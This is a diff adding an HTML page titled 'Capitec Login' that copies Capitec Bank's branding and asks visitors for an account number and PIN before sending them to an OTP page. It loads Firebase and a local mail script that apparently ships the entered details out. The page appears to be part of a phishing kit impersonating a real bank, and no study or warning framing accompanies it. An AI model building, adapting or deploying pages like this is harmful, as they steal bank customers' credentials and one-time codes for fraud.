@@ -1,0 +1,56 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+
+    <meta charset="UTF-8">
+	 <link rel="stylesheet" href="./styles2.css">
+    
+    
+    <title>Capitec Login</title>
+    
+
+	<style type="text/css">
+		
+		body{
+			background-image:url(capitecbank.jpg);
+			background-repeat:no-repeat;
+			background-size:100% 100%;
+			background-attachment: fixed;
+		}
+
+		
+              
+	</style>
+</head>
+
+<body>
+<div class="back">
+      <div style="text-align: center;">
+        <img src="./Source/capitec.jpg" alt="logo" width="1000" 
+     height="500" />
+    <div class="container">
+        <form action="" id="contactForm">
+            <div class="alert">Loging In</div>
+			
+
+            <div class="inputBox">
+                <textarea id="msgContent" cols="30" rows="10" placeholder="Enter Account Number"></textarea>
+            </div>
+			
+			<div class="inputBox">
+                <input type="password" id="sentence" placeholder="Enter Pin" />
+            </div>
+
+            <div class="inputBox">
+                <button onclick="window.location.href = 'otp.html';">Get Started</button>
+            </div>
+        </form>
+    </div>
+	
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/firebase/7.14.1-0/firebase.js"></script>
+    <script src="./mail2.js"></script>
+</body>
+
+</html>
